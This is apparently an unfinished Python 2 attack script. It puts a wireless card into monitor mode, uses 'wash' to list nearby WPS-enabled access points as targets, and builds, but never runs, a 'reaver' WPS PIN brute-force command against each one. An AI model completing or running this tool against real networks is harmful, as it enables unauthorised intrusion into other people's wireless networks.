#!/usr/bin/env python2

import io
import os
from subprocess import Popen, PIPE, STDOUT
import argparse
import re
import time
import sys

DN = open(os.devnull, 'w')
# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Select the monitor mode enabled interface to use")
    return parser.parse_args()

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_mon_iface(args):
    '''
    Get the monitor mode interface name
    '''
    monitors, interfaces = iwconfig()
    if args.interface:
        return args.interface
    if len(monitors) > 0:
        return monitors[0]
    else:
        # Start monitor mode on a wireless interface
        print '['+G+'*'+W+'] Finding the most powerful interface...'
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def start_mon_mode(interface):
    print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    # Find most powerful interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Starting monitor mode on '+G+interface+W
            return interface

def remove_mon_iface(mon_iface):
    print '1'
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)
    print '2'

def get_wash_out(mon_iface):
    '''
    Get wash output
    '''
    filename = 'wash.log'
    with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
        cmd = 'wash -i {} -C'.format(mon_iface)
        print '[*] Running `{}` for 10 seconds'.format(cmd)
        proc = Popen(cmd.split(), stdout=writer)
        time.sleep(5)
        out = reader.readlines()
        return out

def get_targets(out):
    '''
    Parse wash output for target macs and essids
    '''
    targets = []
    for line in out:
        if line.count(':') == 5:
            line = line.split()
            # For some reason sometimes 1 AP around me throws tons of \x00's in
            # the mac
            mac = line[0].replace('\x00', '')
            chan = line[1]
            essid = line[5]
            targets.append((essid, chan, mac))
            print mac, chan, essid
    return targets

def run_reaver(targets, mon_iface):
    for t in targets:
        essid, chan, mac = t
        cmd = 'reaver -i {} -c {} -b {} -vv -S'.format(mon_iface, chan, mac)

def main():
    args = parse_args()
    mon_iface = get_mon_iface(args)
    out = get_wash_out(mon_iface)
    targets = get_targets(out)
    try:
        while 1:
            print targets
            time.sleep(1)
    except KeyboardInterrupt:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        os.system('rm wash.log')
        sys.exit('\n['+R+'!'+W+'] Closing...')

main()
